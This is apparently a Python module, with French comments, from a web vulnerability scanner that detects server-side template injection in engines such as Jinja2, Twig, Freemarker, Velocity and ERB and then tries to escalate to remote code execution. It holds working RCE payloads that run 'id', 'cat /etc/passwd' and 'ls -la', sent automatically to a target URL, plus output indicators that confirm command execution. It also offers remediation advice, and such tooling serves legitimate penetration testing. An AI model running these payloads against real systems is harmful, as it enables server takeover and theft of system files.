"""
Scanner de vulnérabilités SSTI (Server-Side Template Injection)
Détection automatique et exploitation de template engines
"""

import asyncio
import re
from typing import Optional, List, Dict, Tuple
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class ScannerSSTI:
    """
    Détecte les vulnérabilités Server-Side Template Injection
    Supporte: Jinja2, Twig, Freemarker, Velocity, ERB, Thymeleaf, Smarty, Mako
    """

    def __init__(self, auth_config: Dict = None):
        """
        Initialise le scanner SSTI
        
        Args:
            auth_config: Configuration d'authentification
        """
        self.auth_config = auth_config or {}
        
        # Payloads de détection par moteur de templates
        # Format: (payload, expected_result, template_engine, severite)
        self.payloads_detection = [
            # Jinja2 (Python/Flask) - Le plus courant
            ("{{7*7}}", "49", "Jinja2", "CRITIQUE"),
            ("{{7*'7'}}", "7777777", "Jinja2", "CRITIQUE"),
            ("{{ config }}", "Config", "Jinja2", "CRITIQUE"),
            ("{{ self._TemplateReference__context }}", "context", "Jinja2", "CRITIQUE"),
            
            # Jinja2 RCE polyglot
            ("{{ ''.__class__.__mro__[1].__subclasses__() }}", "subprocess", "Jinja2", "CRITIQUE"),
            
            # Twig (PHP/Symfony)
            ("{{7*7}}", "49", "Twig", "CRITIQUE"),
            ("{{7*'7'}}", "49", "Twig", "CRITIQUE"),  # Twig fait la conversion
            ("{{_self}}", "Template", "Twig", "CRITIQUE"),
            ("{{_self.env}}", "Twig", "Twig", "CRITIQUE"),
            
            # Freemarker (Java)
            ("${7*7}", "49", "Freemarker", "CRITIQUE"),
            ("#{7*7}", "49", "Freemarker", "CRITIQUE"),
            ("${{7*7}}", "49", "Freemarker", "CRITIQUE"),
            ("<#assign ex='freemarker.template.utility.Execute'?new()>", "freemarker", "Freemarker", "CRITIQUE"),
            
            # Velocity (Java)
            ("#set($x=7*7)$x", "49", "Velocity", "CRITIQUE"),
            ("$class.inspect('java.lang.Runtime')", "Runtime", "Velocity", "CRITIQUE"),
            
            # ERB (Ruby/Rails)
            ("<%= 7*7 %>", "49", "ERB", "CRITIQUE"),
            ("<%= system('id') %>", "uid=", "ERB", "CRITIQUE"),
            
            # Thymeleaf (Java/Spring)
            ("[[${7*7}]]", "49", "Thymeleaf", "CRITIQUE"),
            ("[(${7*7})]", "49", "Thymeleaf", "CRITIQUE"),
            
            # Smarty (PHP)
            ("{7*7}", "49", "Smarty", "CRITIQUE"),
            ("{$smarty.version}", "Smarty", "Smarty", "CRITIQUE"),
            
            # Mako (Python)
            ("${7*7}", "49", "Mako", "CRITIQUE"),
            ("<%=7*7%>", "49", "Mako", "CRITIQUE"),
            
            # Tornado (Python)
            ("{{ 7*7 }}", "49", "Tornado", "CRITIQUE"),
            
            # Handlebars (JavaScript)
            ("{{#with 'a' as |string|}}{{#with 'b'}}{{#with '../string'}}{{.}}{{/with}}{{/with}}{{/with}}", "a", "Handlebars", "HAUTE"),
            
            # Pug/Jade (Node.js)
            ("#{7*7}", "49", "Pug", "CRITIQUE"),
            
            # AngularJS (client-side mais peut être server-side)
            ("{{7*7}}", "49", "AngularJS", "HAUTE"),
            ("{{constructor.constructor('alert(1)')()}}", "alert", "AngularJS", "HAUTE"),
        ]
        
        # Payloads RCE avancés par moteur
        self.payloads_rce = {
            'Jinja2': [
                # RCE classique via __subclasses__
                "{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0].strip() }}",
                # Bypass filters
                "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
                "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
            ],
            'Twig': [
                # RCE via _self.env
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /etc/passwd')}}",
            ],
            'Freemarker': [
                # RCE via Execute
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.lang.ProcessBuilder','id').start()}",
            ],
            'Velocity': [
                # RCE via Runtime
                "#set($rt=$class.forName('java.lang.Runtime'))#set($chr=$class.forName('java.lang.Character'))#set($str='ls -la')$rt.getRuntime().exec($str)",
            ],
            'ERB': [
                # RCE direct
                "<%= system('cat /etc/passwd') %>",
                "<%= `id` %>",
                "<%= IO.popen('id').readlines() %>",
            ],
        }

    async def scanner(self, url: str, params: Dict = None) -> List[Vulnerabilite]:
        """
        Scanne les vulnérabilités SSTI
        
        Args:
            url: URL à tester
            params: Paramètres découverts
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités SSTI trouvées
        """
        vulnerabilites = []
        
        if not params:
            logger.debug(f"⏭️  Pas de paramètres pour SSTI: {url}")
            return vulnerabilites
        
        logger.info(f"🔍 Test SSTI: {url}")
        
        try:
            async with aiohttp.ClientSession(
                cookies=self.auth_config.get('cookies'),
                headers=self.auth_config.get('headers')
            ) as session:
                # Phase 1: Détection du moteur de templates
                for param_name in params.keys():
                    engine_detected, vuln = await self._detecter_template_engine(
                        session, url, param_name, params
                    )
                    
                    if engine_detected:
                        vulnerabilites.append(vuln)
                        logger.success(f"✅ SSTI {engine_detected} trouvé: {param_name}")
                        
                        # Phase 2: Tenter RCE si moteur connu
                        if engine_detected in self.payloads_rce:
                            rce_vuln = await self._tester_rce(
                                session, url, param_name, params, engine_detected
                            )
                            if rce_vuln:
                                vulnerabilites.append(rce_vuln)
                    
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Erreur test SSTI: {str(e)}")
        
        return vulnerabilites

    async def _detecter_template_engine(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> Tuple[Optional[str], Optional[Vulnerabilite]]:
        """
        Détecte le moteur de templates utilisé
        
        Returns:
            (engine_name, vulnerabilite) ou (None, None)
        """
        # Récupérer la réponse baseline
        baseline = await self._get_baseline_response(session, url, param_name, params)
        
        for payload, expected, engine, severite in self.payloads_detection:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    # Vérifier si le résultat attendu est dans la réponse
                    if expected in contenu and contenu != baseline:
                        # Confirmation: tester avec autre calcul
                        confirmed = await self._confirmer_ssti(
                            session, url, param_name, params, engine
                        )
                        
                        if confirmed:
                            return engine, Vulnerabilite(
                                type="SSTI",
                                severite=severite,
                                url=url,
                                description=f"Server-Side Template Injection ({engine}) via '{param_name}'. Permet l'exécution de code arbitraire côté serveur.",
                                payload=f"{param_name}={payload}",
                                preuve=f"Payload: {payload} → Résultat: {contenu[:200]}",
                                cvss_score=9.8,
                                remediation=self._get_remediation_ssti(engine)
                            )
            
            except Exception as e:
                logger.debug(f"Erreur payload SSTI {payload}: {str(e)}")
                continue
        
        return None, None

    async def _confirmer_ssti(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict,
        engine: str
    ) -> bool:
        """
        Confirme la vulnérabilité SSTI avec un second test
        """
        # Payloads de confirmation différents
        confirmations = {
            'Jinja2': ('{{8*8}}', '64'),
            'Twig': ('{{8*8}}', '64'),
            'Freemarker': ('${8*8}', '64'),
            'Velocity': ('#set($x=8*8)$x', '64'),
            'ERB': ('<%= 8*8 %>', '64'),
            'Thymeleaf': ('[[${8*8}]]', '64'),
            'Smarty': ('{8*8}', '64'),
            'Mako': ('${8*8}', '64'),
        }
        
        if engine not in confirmations:
            return True  # Pas de confirmation pour ce moteur
        
        payload, expected = confirmations[engine]
        
        try:
            test_params = params.copy()
            test_params[param_name] = payload
            
            async with session.get(
                url,
                params=test_params,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                contenu = await response.text()
                return expected in contenu
        
        except Exception:
            return False

    async def _tester_rce(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict,
        engine: str
    ) -> Optional[Vulnerabilite]:
        """
        Teste les payloads RCE pour le moteur détecté
        """
        if engine not in self.payloads_rce:
            return None
        
        for rce_payload in self.payloads_rce[engine]:
            try:
                test_params = params.copy()
                test_params[param_name] = rce_payload
                
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    # Indicateurs de RCE réussi
                    rce_indicators = ['uid=', 'gid=', 'groups=', 'root:', '/bin/', '/etc/passwd']
                    
                    if any(ind in contenu for ind in rce_indicators):
                        return Vulnerabilite(
                            type="SSTI_RCE",
                            severite="CRITIQUE",
                            url=url,
                            description=f"SSTI avec RCE confirmé ({engine}). Exécution de commandes système réussie.",
                            payload=f"{param_name}={rce_payload}",
                            preuve=contenu[:500],
                            cvss_score=10.0,
                            remediation=self._get_remediation_ssti(engine)
                        )
            
            except Exception as e:
                logger.debug(f"Erreur RCE SSTI: {str(e)}")
                continue
        
        return None

    async def _get_baseline_response(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> str:
        """Récupère la réponse baseline pour comparaison"""
        try:
            test_params = params.copy()
            test_params[param_name] = "baseline_test_123"
            
            async with session.get(
                url,
                params=test_params,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                return await response.text()
        except Exception:
            return ""

    def _get_remediation_ssti(self, engine: str) -> str:
        """Recommandations de remediation par moteur"""
        base_remediation = f"""
Remediation SSTI ({engine}):

1. NE JAMAIS inclure d'input utilisateur directement dans les templates
2. Utiliser un système de templates sécurisé avec sandbox activé
3. Valider et sanitizer TOUTES les entrées utilisateur
4. Implémenter une whitelist de fonctions/objets accessibles
5. Désactiver les fonctions dangereuses dans le moteur de templates
6. Utiliser des templates pré-compilés quand possible
7. Principe du moindre privilège pour l'application
8. WAF pour bloquer patterns SSTI connus
9. Logs et monitoring des erreurs de templates
10. Content Security Policy (CSP) strict

Spécifique {engine}:
"""
        
        specifics = {
            'Jinja2': "- Utiliser autoescape='True'\n- Désactiver _getattr_ dans Environment\n- Ne pas exposer config, request, self",
            'Twig': "- Utiliser autoescape\n- Bloquer l'accès à _self.env\n- Sandbox mode en production",
            'Freemarker': "- Activer le mode restricted\n- Bloquer freemarker.template.utility.*\n- Configuration sécurisée new_builtin_class_resolver",
            'ERB': "- Utiliser ERB::Util.html_escape\n- Safe level 4 pour sandbox\n- Ne pas évaluer l'input utilisateur",
        }
        
        return base_remediation + specifics.get(engine, "- Consulter la documentation de sécurité du moteur")


# Test
async def test_ssti():
    """Test du scanner SSTI"""
    scanner = ScannerSSTI()
    test_url = "http://testphp.vulnweb.com/search.php"
    test_params = {'q': 'test', 'template': ''}
    
    vulns = await scanner.scanner(test_url, test_params)
    print(f"{'✅' if vulns else '❌'} {len(vulns)} vulnérabilités SSTI trouvées")


if __name__ == "__main__":
    asyncio.run(test_ssti())
